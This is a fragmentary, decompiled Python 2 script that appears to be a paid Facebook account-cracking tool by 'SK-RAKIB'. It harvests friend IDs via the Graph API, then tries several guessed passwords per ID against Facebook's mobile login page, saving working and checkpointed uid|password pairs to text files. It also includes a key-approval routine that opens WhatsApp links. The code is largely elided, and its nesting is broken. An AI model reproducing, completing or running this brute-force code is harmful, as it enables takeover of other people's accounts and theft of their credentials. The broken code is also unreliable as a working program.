...
# File: Mr_SK-RAKIB-PAID.py (Python 2.7)
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;34m Author \x1b[1;97m : \033[1;34m        SK-RAKIB
\033[1;31m\033[1;35m Facebook\x1b[1;97m:  \033[1;35m       SK-RAKIB  
...
def main_apv():
    ...
    try:
        ...
        print '         YOUR KEY : ' + imt
        kok = open('/sdcard/.SK-RAKIB.txt', 'w')
        kok.write(imt)
        kok.close()
        print ''
        ...
        os.system('xdg-open https://wa.me/+880184###4250')
    ...
    if key1 in r1:
        ...
        print '     Age Permeant Kore Key Approved Kore Nen Bro'
        raw_input('    Press enter to check Approval')
        os.system('xdg-open https://wa.me/+88016122###37')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In Mr.SK-RAKIB Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SK-RAKIB-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[SK-RAKIB-CP] ' + coc + user + ' | ' + pass1
                cp = open('SK-RAKIB random-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From SK-RAKIB : ' + my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From zSK-RAKIB : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ISK-RAKIB-OK] ' + uid + ' | ' + pass1
                ok = open('SK-RAKIB-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass1
                cp = open('SK-RAKIB-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass2
                    ok = open('SK-RAKIB-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass2
                    cp = open('SK-RAKIB-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass3
                        ok = open('SK-RAKIB-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass3
                        cp = open('SK-RAKIB-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass4
                            ok = open('SK-RAKIB-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ISK-RAKIB-CP] ' + uid + ' | ' + pass4
                            cp = open('SK-RAKIB-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass5
                                ok = open('SK-RAKIB-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass5
                                cp = open('SK-RAKIB-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass1
                ok = open('SK-RAKIB-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass4
                            cp = open('SK-RAKIB-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[ISK-RAKIB-CP] ' + uid + ' | ' + pass5
                                cp = open('SK-RAKIB-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[SK-RAKIB-OK] ' + uid + ' | ' + pass6
                                    ok = open('SK-RAKIB-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[SK-RAKIB-CP] ' + uid + ' | ' + pass6
                                    cp = open('SK-RAKIB-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
